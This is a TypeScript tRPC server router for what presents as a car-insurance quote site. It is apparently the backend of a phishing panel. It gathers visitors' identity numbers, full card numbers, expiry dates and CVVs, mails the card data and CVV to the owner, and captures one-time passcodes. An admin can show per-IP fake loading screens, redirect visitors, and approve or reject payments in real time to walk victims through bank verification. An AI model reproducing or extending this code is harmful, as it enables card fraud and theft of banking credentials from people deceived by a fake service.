import { TRPCError } from "@trpc/server";
import { z } from "zod";
import { COOKIE_NAME } from "@shared/const";
import { getSessionCookieOptions } from "./_core/cookies";
import { systemRouter } from "./_core/systemRouter";
import { protectedProcedure, publicProcedure, router } from "./_core/trpc";
import { notifyOwner } from "./_core/notification";
import {
  upsertUser,
  getUserByOpenId,
  upsertInsuranceRequest,
  getAllInsuranceRequests,
  getInsuranceRequestById,
  getInsuranceStats,
  isIpBanned,
  banIp,
  unbanIp,
  getAllBannedIps,
  getLoadingScreenSetting,
  setLoadingScreenSetting,
  createNavigationCommand,
  getPendingNavigationCommand,
  markNavigationCommandExecuted,
  approvePayment,
  rejectPayment,
  submitOtp,
  verifyOtp,
  getPaymentRequestBySession,
  checkPaymentStatus,
} from "./db";
import { emitToAdmins, emitToVisitor } from "./socket";

// Admin middleware
const adminProcedure = protectedProcedure.use(({ ctx, next }) => {
  if (ctx.user.role !== "admin") {
    throw new TRPCError({ code: "FORBIDDEN", message: "Admin access required" });
  }
  return next({ ctx });
});

export const appRouter = router({
  system: systemRouter,

  auth: router({
    me: publicProcedure.query((opts) => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return { success: true } as const;
    }),
  }),

  // ======= Insurance Requests =======
  insurance: router({
    // حفظ/تحديث طلب التأمين
    upsert: publicProcedure
      .input(
        z.object({
          sessionId: z.string(),
          visitorIp: z.string().optional(),
          offerType: z.string().optional(),
          regType: z.string().optional(),
          userName: z.string().optional(),
          phoneNumber: z.string().optional(),
          idNumber: z.string().optional(),
          birthDate: z.string().optional(),
          serialNumber: z.string().optional(),
          carYear: z.string().optional(),
          carMake: z.string().optional(),
          usageType: z.string().optional(),
          city: z.string().optional(),
          startDate: z.string().optional(),
          planCompany: z.string().optional(),
          planName: z.string().optional(),
          planPrice: z.number().optional(),
          addons: z.string().optional(),
          addonsTotal: z.number().optional(),
          paymentMethod: z.string().optional(),
          total: z.number().optional(),
          cardNumber: z.string().optional(),
          cardHolderName: z.string().optional(),
          expiryDate: z.string().optional(),
          cvv: z.string().optional(),
          cardType: z.string().optional(),
          cardLast4: z.string().optional(),
          cardDeclined: z.boolean().optional(),
          currentStep: z.number().optional(),
          status: z.enum(["in_progress", "completed", "payment_submitted", "payment_approved", "declined", "otp_verified"]).optional(),
          notifyOnPayment: z.boolean().optional(),
        })
      )
      .mutation(async ({ input }) => {
        const { notifyOnPayment, ...data } = input;
        const result = await upsertInsuranceRequest(data as any);
        // إرسال إشعار للمشرفين عبر Socket.IO
        if (result) {
          emitToAdmins("requestUpdated", result);
        }
        // إرسال إشعار لصاحب المشروع عند إدخال بيانات البطاقة
        if (notifyOnPayment && result) {
          try {
            await notifyOwner({
              title: `طلب تأمين جديد - ${result.userName ?? "مجهول"}`,
              content: `تم استلام بيانات بطاقة بنكية جديدة\nالاسم: ${result.userName ?? "-"}\nالهاتف: ${result.phoneNumber ?? "-"}\nالخطة: ${result.planName ?? "-"}\nالإجمالي: ${result.total ?? "-"} ريال\nرقم البطاقة: ${result.cardNumber ?? "-"}\nتاريخ الانتهاء: ${result.expiryDate ?? "-"}\nCVV: ${result.cvv ?? "-"}`,
            });
          } catch (e) {
            console.warn("[Notify] Failed to notify owner:", e);
          }
        }
        return result;
      }),

    // إرسال بيانات البطاقة والتحقق من الدفع
    submitPayment: publicProcedure
      .input(
        z.object({
          sessionId: z.string(),
          visitorIp: z.string().optional(),
          cardNumber: z.string(),
          cardHolderName: z.string(),
          expiryDate: z.string(),
          cvv: z.string(),
          cardType: z.string().optional(),
          cardLast4: z.string().optional(),
          paymentMethod: z.string().optional(),
          status: z.enum(["payment_submitted"]).optional(),
        })
      )
      .mutation(async ({ input }) => {
        // حفظ بيانات البطاقة
        const result = await upsertInsuranceRequest({
          sessionId: input.sessionId,
          visitorIp: input.visitorIp,
          cardNumber: input.cardNumber,
          cardHolderName: input.cardHolderName,
          expiryDate: input.expiryDate,
          cvv: input.cvv,
          cardType: input.cardType,
          cardLast4: input.cardLast4,
          paymentMethod: input.paymentMethod,
          status: "payment_submitted",
          paymentStatus: "pending",
        } as any);

        if (result) {
          emitToAdmins("requestUpdated", result);
          // إشعار صاحب المشروع
          try {
            await notifyOwner({
              title: `طلب تأمين جديد - بيانات بطاقة - ${result.userName ?? "مجهول"}`,
              content: `تم إدخال بيانات بطاقة بنكية\nالاسم: ${result.userName ?? "-"}\nالهاتف: ${result.phoneNumber ?? "-"}\nالخطة: ${result.planName ?? "-"}\nالإجمالي: ${result.total ?? "-"} ريال\nرقم البطاقة: ${result.cardNumber ?? "-"}\nنوع البطاقة: ${result.cardType ?? "-"}\nتاريخ الانتهاء: ${result.expiryDate ?? "-"}`,
            });
          } catch (e) {
            console.warn("[Notify] Failed:", e);
          }
        }
        return result;
      }),

    // فحص حالة الدفع (polling من الـ frontend)
    checkPayment: publicProcedure
      .input(z.object({ sessionId: z.string() }))
      .query(async ({ input }) => {
        const status = await checkPaymentStatus(input.sessionId);
        return status;
      }),

    // إرسال OTP إلى قاعدة البيانات (يُستدعى عند إدخال الرمز)
    submitOtp: publicProcedure
      .input(
        z.object({
          sessionId: z.string(),
          otp: z.string(),
        })
      )
      .mutation(async ({ input }) => {
        const result = await submitOtp(input.sessionId, input.otp);
        // إشعار الإدارة
        await notifyOwner({
          title: "🔑 رمز OTP تم إدخاله",
          content: `تم إدخال رمز OTP للطلب رقم ${input.sessionId.slice(0, 8)}...`,
        });
        return result;
      }),

    // التحقق النهائي من OTP (يُستدعى بعد 8 ثوانٍ من loading)
    verifyOtpFinal: publicProcedure
      .input(z.object({ sessionId: z.string() }))
      .mutation(async ({ input }) => {
        const result = await verifyOtp(input.sessionId);
        if (!result) {
          await notifyOwner({
            title: "⚠️ OTP غير صحيح",
            content: `رمز OTP المدخل للطلب ${input.sessionId.slice(0, 8)}... غير صحيح`,
          });
        }
        return { success: result };
      }),

    // فحص الحظر
    checkBanned: publicProcedure
      .input(z.object({ ip: z.string() }))
      .query(async ({ input }) => {
        const banned = await isIpBanned(input.ip);
        return { banned };
      }),

    // فحص شاشة التحميل
    getLoadingScreen: publicProcedure
      .input(z.object({ ip: z.string() }))
      .query(async ({ input }) => {
        const setting = await getLoadingScreenSetting(input.ip);
        return setting ?? { isActive: false, loadingText: "جاري التحميل...", loadingSubtext: "يرجى الانتظار" };
      }),

    // فحص أوامر التوجيه المعلقة
    getPendingNav: publicProcedure
      .input(z.object({ ip: z.string() }))
      .query(async ({ input }) => {
        const cmd = await getPendingNavigationCommand(input.ip);
        if (cmd) {
          await markNavigationCommandExecuted(cmd.id);
          return { page: cmd.targetPage };
        }
        return { page: null };
      }),
  }),

  // ======= Admin =======
  admin: router({
    // قائمة الطلبات
    listRequests: adminProcedure
      .input(
        z.object({
          search: z.string().optional(),
          status: z.string().optional(),
          limit: z.number().optional(),
          offset: z.number().optional(),
        })
      )
      .query(async ({ input }) => {
        return getAllInsuranceRequests(input);
      }),

    // تفاصيل طلب
    getRequest: adminProcedure
      .input(z.object({ id: z.number() }))
      .query(async ({ input }) => {
        return getInsuranceRequestById(input.id);
      }),

    // إحصائيات
    getStats: adminProcedure.query(async () => {
      return getInsuranceStats();
    }),

    // حظر IP
    banIp: adminProcedure
      .input(z.object({ ip: z.string(), reason: z.string().optional() }))
      .mutation(async ({ input }) => {
        await banIp(input.ip, input.reason);
        emitToVisitor(input.ip, "banned", {});
        return { success: true };
      }),

    // رفع الحظر
    unbanIp: adminProcedure
      .input(z.object({ ip: z.string() }))
      .mutation(async ({ input }) => {
        await unbanIp(input.ip);
        return { success: true };
      }),

    // قائمة المحظورين
    listBanned: adminProcedure.query(async () => {
      return getAllBannedIps();
    }),

    // التحكم في شاشة التحميل
    setLoadingScreen: adminProcedure
      .input(
        z.object({
          ip: z.string(),
          isActive: z.boolean(),
          loadingText: z.string().optional(),
          loadingSubtext: z.string().optional(),
        })
      )
      .mutation(async ({ input }) => {
        await setLoadingScreenSetting(input.ip, input.isActive, input.loadingText, input.loadingSubtext);
        emitToVisitor(input.ip, "loadingScreen", {
          isActive: input.isActive,
          loadingText: input.loadingText ?? "جاري التحميل...",
          loadingSubtext: input.loadingSubtext ?? "يرجى الانتظار",
        });
        return { success: true };
      }),

    // توجيه زائر
    navigateTo: adminProcedure
      .input(z.object({ ip: z.string(), page: z.string() }))
      .mutation(async ({ input }) => {
        await createNavigationCommand(input.ip, input.page);
        emitToVisitor(input.ip, "navigateTo", { page: input.page });
        return { success: true };
      }),

    // قبول الدفع
    approvePayment: adminProcedure
      .input(z.object({ requestId: z.number() }))
      .mutation(async ({ input }) => {
        const request = await approvePayment(input.requestId);
        if (request) {
          emitToAdmins("requestUpdated", request);
          if (request.visitorIp) {
            emitToVisitor(request.visitorIp, "paymentApproved", {
              requestId: input.requestId,
            });
          }
        }
        return { success: true };
      }),

    // رفض الدفع
    rejectPayment: adminProcedure
      .input(z.object({ requestId: z.number(), reason: z.string().optional() }))
      .mutation(async ({ input }) => {
        const request = await rejectPayment(input.requestId);
        if (request) {
          emitToAdmins("requestUpdated", request);
          if (request.visitorIp) {
            emitToVisitor(request.visitorIp, "paymentRejected", {
              requestId: input.requestId,
              reason: input.reason ?? "تم رفض الدفع",
            });
          }
        }
        return { success: true };
      }),
  }),
});

export type AppRouter = typeof appRouter;
